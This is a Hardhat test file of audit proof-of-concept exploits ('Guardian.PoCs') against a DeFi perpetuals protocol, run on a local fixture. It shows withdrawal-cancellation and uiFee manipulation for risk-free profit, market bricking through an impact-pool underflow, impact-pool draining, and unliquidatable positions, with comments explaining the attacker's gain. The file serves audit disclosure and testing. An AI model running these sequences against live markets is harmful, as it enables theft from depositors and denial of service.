import { expect } from "chai";

import { deployFixture } from "../../utils/fixture";
import { expandDecimals, decimalToFloat } from "../../utils/math";
import { handleDeposit } from "../../utils/deposit";
import { OrderType, handleOrder } from "../../utils/order";
import { getIsAdlEnabled, updateAdlState, executeAdl } from "../../utils/adl";
import { grantRole } from "../../utils/role";
import * as keys from "../../utils/keys";
import { getPositionCount } from "../../utils/position";
import { getAccountPositionCount } from "../../utils/position";
import { time } from "@nomicfoundation/hardhat-network-helpers";
import { getPositionKeys } from "../../utils/position";
import { getOrderCount } from "../../utils/order";
import { executeLiquidation } from "../../utils/liquidation";
import { handleWithdrawal } from "../../utils/withdrawal";
import { getBalanceOf, getSupplyOf } from "../../utils/token";
import { createWithdrawal, getWithdrawalKeys, getWithdrawalCount, executeWithdrawal } from "../../utils/withdrawal";

describe("Guardian.PoCs", () => {
  let fixture;
  let wallet, user0, user1, user2, user3, reader;
  let roleStore,
    dataStore,
    wbtc,
    ethUsdMarket,
    oracle,
    wnt,
    usdc,
    btcUsdMarket,
    ethUsdSingleTokenMarket,
    referralStorage,
    exchangeRouter,
    errors,
    attackContract;

  beforeEach(async () => {
    fixture = await deployFixture();
    ({ wallet, user0, user1, user2, user3 } = fixture.accounts);
    ({
      roleStore,
      dataStore,
      ethUsdMarket,
      oracle,
      wbtc,
      wnt,
      usdc,
      ethUsdSingleTokenMarket,
      reader,
      referralStorage,
      exchangeRouter,
      btcUsdMarket,
      errors,
      attackContract,
    } = fixture.contracts);

    await handleDeposit(fixture, {
      create: {
        account: user0,
        market: btcUsdMarket,
        longTokenAmount: expandDecimals(100, 18),
        shortTokenAmount: expandDecimals(50_000 * 100, 6),
      },
      execute: {
        tokens: [wbtc.address, usdc.address],
        minPrices: [expandDecimals(50_000, 4), expandDecimals(1, 6)],
        maxPrices: [expandDecimals(50_000, 4), expandDecimals(1, 6)],
        precisions: [8, 18],
      },
    });
  });

  it.only("uiFee Manipulation", async function () {
    const USER_1_DEPOSIT_AMOUNT_LONG = expandDecimals(1_000, 18);
    const USER_1_DEPOSIT_AMOUNT_SHORT = expandDecimals(5_000_000, 6);

    await dataStore.setUint(keys.MAX_UI_FEE_FACTOR, decimalToFloat(5, 5)); // Half a BIP

    // Notice that the target price could also come from some oracle or DEX quote
    // This way outdated prices can be automatically taken advantage of at the detriment of
    // market depositors
    await attackContract.configure(exchangeRouter.address, oracle.address, wnt.address, 5000000000000000);

    // User 1 deposits into the market
    await handleDeposit(fixture, {
      create: {
        account: user1,
        market: ethUsdMarket,
        longTokenAmount: USER_1_DEPOSIT_AMOUNT_LONG,
        shortTokenAmount: USER_1_DEPOSIT_AMOUNT_SHORT,
      },
    });

    // User 1 creates a withdrawal with a malicious uiFeeReceiver and receiver address
    await createWithdrawal(fixture, {
      account: user1,
      receiver: attackContract,
      uiFeeReceiver: attackContract,
      market: ethUsdMarket,
      marketTokenAmount: expandDecimals(1000, 18),
      minLongTokenAmount: 100,
      minShortTokenAmount: expandDecimals(1, 16),
      shouldUnwrapNativeToken: true,
      shortTokenSwapPath: [btcUsdMarket.marketToken],
      gasUsageLabel: "createWithdrawal",
    });

    let withdrawalKeys = await getWithdrawalKeys(dataStore, 0, 1);
    let withdrawal = await reader.getWithdrawal(dataStore.address, withdrawalKeys[0]);

    expect(withdrawal.addresses.account).eq(user1.address);
    expect(await getWithdrawalCount(dataStore)).eq(1);

    // Attacker Contract observes that the price of ether provided in the withdrawal execution does not offer
    // any sort of risk free profit and so automatically gets the withdrawal cancelled without any necessary front-running.
    //
    // Notice that the minShortTokenAmount is independant from the price of the long token or the longTokenSwapPath
    // this enables a user to take advantage of advantageous prices with the longTokenSwapPath, meanwhile the conditions
    // for a withdrawal cancellation are not dependent on those prices.
    //
    // In this example we assume BTC-USD remains at a similar price, however the shortTokenSwapPath could use even
    // more stable pairs -- where even small deviations in the output amount created by the uiFee can reliably cause a revert.
    //
    // Additionally, note that with longer swapPaths the uiFee compounds and it will be much easier to reliably cause
    // a withdrawal (or order) to fail when desired.
    await executeWithdrawal(fixture, {
      tokens: [wbtc.address, usdc.address, wnt.address],
      minPrices: [expandDecimals(50_000, 4), expandDecimals(1, 6), expandDecimals(4_999, 4)],
      maxPrices: [expandDecimals(50_000, 4), expandDecimals(1, 6), expandDecimals(4_999, 4)],
      precisions: [8, 18, 8],
      expectedCancellationReason: "InsufficientSwapOutputAmount",
    });

    withdrawal = await reader.getWithdrawal(dataStore.address, withdrawalKeys[0]);
    expect(await getWithdrawalCount(dataStore)).eq(0);

    // User 1 creates another withdrawal with a malicious uiFeeReceiver and receiver address
    // hoping to get risk free profit
    await createWithdrawal(fixture, {
      account: user1,
      receiver: attackContract,
      uiFeeReceiver: attackContract,
      market: ethUsdMarket,
      marketTokenAmount: expandDecimals(1000, 18),
      minLongTokenAmount: 100,
      minShortTokenAmount: expandDecimals(1, 16),
      shouldUnwrapNativeToken: true,
      shortTokenSwapPath: [btcUsdMarket.marketToken],
      gasUsageLabel: "createWithdrawal",
    });

    withdrawalKeys = await getWithdrawalKeys(dataStore, 0, 1);
    withdrawal = await reader.getWithdrawal(dataStore.address, withdrawalKeys[0]);

    expect(withdrawal.addresses.account).eq(user1.address);
    expect(await getWithdrawalCount(dataStore)).eq(1);

    // Now the price of ether is able to be taken advantage of and the attacker can leverage this in
    // a longTokenSwapPath to make risk free profit.
    await executeWithdrawal(fixture, {
      tokens: [wbtc.address, usdc.address, wnt.address],
      minPrices: [expandDecimals(50_000, 4), expandDecimals(1, 6), expandDecimals(5_001, 4)],
      maxPrices: [expandDecimals(50_000, 4), expandDecimals(1, 6), expandDecimals(5_001, 4)],
      precisions: [8, 18, 8],
    });

    withdrawal = await reader.getWithdrawal(dataStore.address, withdrawalKeys[0]);
    expect(await getWithdrawalCount(dataStore)).eq(0);
  });

  it("Unliquidatable position due to unaccounted pnlAmountForPool", async function () {
    await dataStore.setUint(keys.borrowingFactorKey(ethUsdMarket.marketToken, true), decimalToFloat(1, 7));
    await dataStore.setUint(keys.borrowingFactorKey(ethUsdMarket.marketToken, false), decimalToFloat(2, 7));
    await dataStore.setUint(keys.borrowingExponentFactorKey(ethUsdMarket.marketToken, true), decimalToFloat(1));
    await dataStore.setUint(keys.borrowingExponentFactorKey(ethUsdMarket.marketToken, false), decimalToFloat(1));
    const USER_1_DEPOSIT_AMOUNT_LONG = expandDecimals(1_000, 18);
    const USER_1_DEPOSIT_AMOUNT_SHORT = expandDecimals(5_000_000, 6);

    // User 1 deposits into the market
    await handleDeposit(fixture, {
      create: {
        account: user1,
        market: ethUsdMarket,
        longTokenAmount: USER_1_DEPOSIT_AMOUNT_LONG,
        shortTokenAmount: USER_1_DEPOSIT_AMOUNT_SHORT,
      },
    });

    // Trader opens a position, pnlToken != collateralToken
    await handleOrder(fixture, {
      create: {
        account: user1,
        market: ethUsdMarket,
        initialCollateralToken: usdc,
        initialCollateralDeltaAmount: expandDecimals(10 * 1000, 6), // $10,000
        swapPath: [],
        sizeDeltaUsd: decimalToFloat(500_000),
        acceptablePrice: expandDecimals(5010, 12),
        executionFee: expandDecimals(1, 15),
        minOutputAmount: 0,
        orderType: OrderType.MarketIncrease,
        isLong: true,
        shouldUnwrapNativeToken: false,
      },
    });

    expect(await getPositionCount(dataStore)).to.eq(1);

    // Build up a bunch of fees to make the position liquidatable even when in profit
    await time.increase(17000 * 24 * 60 * 60);

    // Execute the liquidation and see what happens
    await expect(
      executeLiquidation(fixture, {
        account: user1.address,
        market: ethUsdMarket,
        collateralToken: usdc,
        isLong: true,
        minPrices: [expandDecimals(5010, 4), expandDecimals(1, 6)],
        maxPrices: [expandDecimals(5010, 4), expandDecimals(1, 6)],
      })
    ).to.be.revertedWithCustomError(errors, "InvalidMarketTokenBalance");
  });

  it("MKTU-1 HIGH: Malicious Actor Can Brick Markets", async function () {
    const USER_1_DEPOSIT_AMOUNT = expandDecimals(100_000, 18);

    // Set price impact factors such that negative price impact is greater than positive price impact.
    // This will occur somewhat often on the exchange, but notice that a similar effect can always be engineered
    // using the virtual inventory.

    // set negative price impact to 0.5% for every $50,000 of token imbalance
    // 0.5% => 0.005
    // 0.005 / 50,000 => 1 * (10 ** -7)
    await dataStore.setUint(keys.positionImpactFactorKey(ethUsdMarket.marketToken, false), decimalToFloat(1, 7));

    // set positive price impact to 0.01% for every $50,000 of token imbalance
    // 0.1% => 0.001
    // 0.001 / 50,000 => 1 * (2 ** -8)
    await dataStore.setUint(keys.positionImpactFactorKey(ethUsdMarket.marketToken, true), decimalToFloat(2, 8));

    await dataStore.setUint(keys.positionImpactExponentFactorKey(ethUsdMarket.marketToken), decimalToFloat(2, 0));

    // User 1 deposits into the market
    await handleDeposit(fixture, {
      create: {
        account: user1,
        market: ethUsdMarket,
        longTokenAmount: USER_1_DEPOSIT_AMOUNT,
      },
    });

    // User 1 opens a position and is negatively impacted
    await handleOrder(fixture, {
      create: {
        account: user1,
        market: ethUsdMarket,
        initialCollateralToken: usdc,
        initialCollateralDeltaAmount: expandDecimals(50 * 1000, 6), // $50,000
        swapPath: [],
        sizeDeltaUsd: decimalToFloat(25_000),
        acceptablePrice: expandDecimals(5010, 12),
        executionFee: expandDecimals(1, 15),
        minOutputAmount: 0,
        orderType: OrderType.MarketIncrease,
        isLong: true,
        shouldUnwrapNativeToken: false,
      },
    });

    // The position impact pool is non-zero
    expect(await dataStore.getUint(keys.positionImpactPoolAmountKey(ethUsdMarket.marketToken))).eq("6242197253432210");

    // The user closes their position and the impact pool is still non-zero
    await handleOrder(fixture, {
      create: {
        account: user1,
        market: ethUsdMarket,
        initialCollateralToken: usdc,
        initialCollateralDeltaAmount: 0,
        swapPath: [],
        sizeDeltaUsd: decimalToFloat(25_000),
        acceptablePrice: expandDecimals(5000, 12),
        executionFee: expandDecimals(1, 15),
        minOutputAmount: 0,
        orderType: OrderType.MarketDecrease,
        isLong: true,
        shouldUnwrapNativeToken: false,
      },
    });

    expect(await dataStore.getUint(keys.positionImpactPoolAmountKey(ethUsdMarket.marketToken))).eq("4992509675327735");
    expect(await getPositionCount(dataStore)).to.eq(0);

    const user1MarketTokenBalance = await getBalanceOf(ethUsdMarket.marketToken, user1.address);

    // The user withdraws all of their MarketTokens and a portion is left due to the position impact pool
    await handleWithdrawal(fixture, {
      create: {
        account: user1,
        market: ethUsdMarket,
        marketTokenAmount: user1MarketTokenBalance,
      },
    });

    expect(await dataStore.getUint(keys.poolAmountKey(ethUsdMarket.marketToken, wnt.address))).eq("4992509426013907");
    expect(await dataStore.getUint(keys.positionImpactPoolAmountKey(ethUsdMarket.marketToken))).eq("4992509675327735");

    // Now the user can open another position and becomes negatively impacted again
    await handleOrder(fixture, {
      create: {
        account: user1,
        market: ethUsdMarket,
        initialCollateralToken: usdc,
        initialCollateralDeltaAmount: expandDecimals(5 * 1000, 6),
        swapPath: [],
        sizeDeltaUsd: expandDecimals(6, 30),
        acceptablePrice: expandDecimals(5001, 12),
        executionFee: expandDecimals(1, 15),
        minOutputAmount: 0,
        orderType: OrderType.MarketIncrease,
        isLong: true,
        shouldUnwrapNativeToken: false,
      },
    });

    expect(await getPositionCount(dataStore)).to.eq(1);

    expect(await dataStore.getUint(keys.poolAmountKey(ethUsdMarket.marketToken, wnt.address))).eq("4992509426013907");
    expect(await dataStore.getUint(keys.positionImpactPoolAmountKey(ethUsdMarket.marketToken))).gt("4992509675327735");

    // Underflow revert occurs when anyone attempts to deposit now since the getPoolValueInfo function will
    // attempt to subtract the larger impact pool value from the smaller poolAmount value.
    // The underflow occurs no matter what the PnL of the position is since this subtraction takes place before the
    // PnL is added to the poolValue.
    await expect(
      handleDeposit(fixture, {
        create: {
          account: user1,
          market: ethUsdMarket,
          longTokenAmount: USER_1_DEPOSIT_AMOUNT,
        },
      })
    ).to.be.revertedWithoutReason;
  });

  it("BOU-3 HIGH: Negative PI -> Positive PI", async () => {
    await handleDeposit(fixture, {
      create: {
        market: ethUsdMarket,
        longTokenAmount: expandDecimals(1000, 18),
        shortTokenAmount: expandDecimals(1000, 9),
      },
    });

    const prices = {
      indexTokenPrice: {
        min: expandDecimals(5000, 12),
        max: expandDecimals(5000, 12),
      },
      longTokenPrice: {
        min: expandDecimals(5000, 12),
        max: expandDecimals(5000, 12),
      },
      shortTokenPrice: {
        min: expandDecimals(1, 24),
        max: expandDecimals(1, 24),
      },
    };

    expect(await getAccountPositionCount(dataStore, user0.address)).eq(0);

    // PI
    await dataStore.setUint(keys.maxPositionImpactFactorKey(ethUsdMarket.marketToken, true), decimalToFloat(0));
    await dataStore.setUint(keys.positionImpactFactorKey(ethUsdMarket.marketToken, true), decimalToFloat(1, 8));
    await dataStore.setUint(keys.positionImpactFactorKey(ethUsdMarket.marketToken, false), decimalToFloat(2, 8));
    await dataStore.setUint(keys.positionImpactExponentFactorKey(ethUsdMarket.marketToken), decimalToFloat(2, 0));

    // Dummy Impact Pool Amount
    await dataStore.setUint(keys.positionImpactPoolAmountKey(ethUsdMarket.marketToken), "816326530612244898");

    // User0 creates a long with size $200,000 which negatively affects the OI balance
    await handleOrder(fixture, {
      create: {
        market: ethUsdMarket,
        initialCollateralToken: wnt,
        initialCollateralDeltaAmount: expandDecimals(10, 18),
        sizeDeltaUsd: decimalToFloat(200 * 1000),
        acceptablePrice: expandDecimals(4900, 12),
        triggerPrice: expandDecimals(5000, 12),
        orderType: OrderType.LimitIncrease,
        isLong: true,
      },
      execute: {
        minPrices: [expandDecimals(4800, 4), expandDecimals(1, 6)],
        maxPrices: [expandDecimals(4800, 4), expandDecimals(1, 6)],
      },
    });

    const positionKeys = await getPositionKeys(dataStore, 0, 10);

    const user0Position = await reader.getPositionInfo(
      dataStore.address,
      referralStorage.address,
      positionKeys[0],
      prices,
      0,
      ethers.constants.AddressZero,
      true
    );

    // Although the user negatively impacted the pool, the user receives a positive
    // impact amount. Therefore, the impact pool is drained.
    expect(await dataStore.getUint(keys.positionImpactPoolAmountKey(ethUsdMarket.marketToken))).eq("0");
    expect(user0Position.position.numbers.sizeInTokens).to.be.gte("40816326530612244897");
  });

  it("MKTU-3 Medium: Borrowing fees cause bricked withdrawals", async function () {
    await dataStore.setUint(keys.borrowingFactorKey(ethUsdMarket.marketToken, true), decimalToFloat(1, 9));
    await dataStore.setUint(keys.borrowingFactorKey(ethUsdMarket.marketToken, false), decimalToFloat(1, 9));
    await dataStore.setUint(keys.borrowingExponentFactorKey(ethUsdMarket.marketToken, true), decimalToFloat(1));
    await dataStore.setUint(keys.borrowingExponentFactorKey(ethUsdMarket.marketToken, false), decimalToFloat(1));

    await handleDeposit(fixture, {
      create: {
        market: ethUsdMarket,
        longTokenAmount: expandDecimals(1, 18),
      },
    });

    await handleOrder(fixture, {
      create: {
        account: user1,
        market: ethUsdMarket,
        initialCollateralToken: wnt,
        initialCollateralDeltaAmount: expandDecimals(50, 18),
        swapPath: [],
        sizeDeltaUsd: expandDecimals(500, 30),
        acceptablePrice: expandDecimals(5001, 12),
        executionFee: expandDecimals(1, 15),
        minOutputAmount: 0,
        orderType: OrderType.MarketIncrease,
        isLong: true,
        shouldUnwrapNativeToken: false,
      },
    });

    await handleOrder(fixture, {
      create: {
        account: user2,
        market: ethUsdMarket,
        initialCollateralToken: wnt,
        initialCollateralDeltaAmount: expandDecimals(50, 18),
        swapPath: [],
        sizeDeltaUsd: expandDecimals(1000, 30),
        acceptablePrice: expandDecimals(5001, 12),
        executionFee: expandDecimals(1, 15),
        minOutputAmount: 0,
        orderType: OrderType.MarketIncrease,
        isLong: true,
        shouldUnwrapNativeToken: false,
      },
    });

    await handleOrder(fixture, {
      create: {
        account: user3,
        market: ethUsdMarket,
        initialCollateralToken: wnt,
        initialCollateralDeltaAmount: expandDecimals(50, 18),
        swapPath: [],
        sizeDeltaUsd: expandDecimals(1000, 30),
        acceptablePrice: expandDecimals(5001, 12),
        executionFee: expandDecimals(1, 15),
        minOutputAmount: 0,
        orderType: OrderType.MarketIncrease,
        isLong: true,
        shouldUnwrapNativeToken: false,
      },
    });

    expect(await getPositionCount(dataStore)).to.eq(3);

    await time.increase(7 * 24 * 60 * 60);

    // User does not even have to withdraw entire amount to get `Invalid state, negative poolAmount`
    await expect(
      handleWithdrawal(fixture, {
        create: {
          market: ethUsdMarket,
          marketTokenAmount: expandDecimals(5000, 18),
        },
      })
    ).to.be.revertedWithoutReason;
  });

  it("DPCU-3 HIGH: Unliquidatable position due to capped PI", async () => {
    await handleDeposit(fixture, {
      create: {
        market: ethUsdMarket,
        longTokenAmount: expandDecimals(1000, 18),
        shortTokenAmount: expandDecimals(1000, 9),
      },
    });

    await dataStore.setUint(keys.borrowingFactorKey(ethUsdMarket.marketToken, true), decimalToFloat(1, 9));
    await dataStore.setUint(keys.borrowingFactorKey(ethUsdMarket.marketToken, false), decimalToFloat(1, 9));
    await dataStore.setUint(keys.borrowingExponentFactorKey(ethUsdMarket.marketToken, true), decimalToFloat(1));
    await dataStore.setUint(keys.borrowingExponentFactorKey(ethUsdMarket.marketToken, false), decimalToFloat(2));

    await dataStore.setUint(keys.fundingFactorKey(ethUsdMarket.marketToken), decimalToFloat(1, 10));
    await dataStore.setUint(keys.fundingExponentFactorKey(ethUsdMarket.marketToken), decimalToFloat(1));

    await dataStore.setUint(keys.positionImpactFactorKey(ethUsdMarket.marketToken, true), decimalToFloat(2, 8));
    await dataStore.setUint(keys.positionImpactFactorKey(ethUsdMarket.marketToken, false), decimalToFloat(2, 8));
    await dataStore.setUint(keys.positionImpactExponentFactorKey(ethUsdMarket.marketToken), decimalToFloat(2, 0));

    // User1 creates a short with size $200,000
    await handleOrder(fixture, {
      create: {
        account: user1,
        market: ethUsdMarket,
        initialCollateralToken: usdc,
        initialCollateralDeltaAmount: expandDecimals(50000, 6),
        sizeDeltaUsd: decimalToFloat(200 * 1000),
        acceptablePrice: expandDecimals(4900, 12),
        orderType: OrderType.MarketIncrease,
        isLong: false,
      },
    });

    // User2 creates a long with size $200,000
    await handleOrder(fixture, {
      create: {
        account: user2,
        market: ethUsdMarket,
        initialCollateralToken: wnt,
        initialCollateralDeltaAmount: expandDecimals(10, 18),
        sizeDeltaUsd: decimalToFloat(150 * 1000),
        acceptablePrice: expandDecimals(5100, 12),
        orderType: OrderType.MarketIncrease,
        isLong: true,
      },
    });

    expect(await getAccountPositionCount(dataStore, user1.address)).eq(1);
    expect(await getAccountPositionCount(dataStore, user2.address)).eq(1);
    expect(await getPositionCount(dataStore)).eq(2);
    expect(await getOrderCount(dataStore)).eq(0);

    await dataStore.setUint(keys.MIN_COLLATERAL_USD, decimalToFloat(250_000)); // Position is liquidatable
    await dataStore.setUint(keys.positionFeeFactorKey(ethUsdMarket.marketToken), decimalToFloat(5, 10));
    await dataStore.setUint(keys.POSITION_FEE_RECEIVER_FACTOR, decimalToFloat(1, 0));

    await time.increase(14 * 24 * 60 * 60);

    await dataStore.setUint(keys.maxPositionImpactFactorKey(ethUsdMarket.marketToken, false), decimalToFloat(1, 10));

    await expect(
      executeLiquidation(fixture, {
        account: user1.address,
        market: ethUsdMarket,
        collateralToken: usdc,
        isLong: false,
        minPrices: [expandDecimals(4600, 4), expandDecimals(1, 6)],
        maxPrices: [expandDecimals(4600, 4), expandDecimals(1, 6)],
      })
    ).to.be.revertedWithCustomError(errors, "InvalidMarketTokenBalance");

    expect(await getAccountPositionCount(dataStore, user1.address)).eq(1);
    expect(await getOrderCount(dataStore)).eq(0);
  });
});
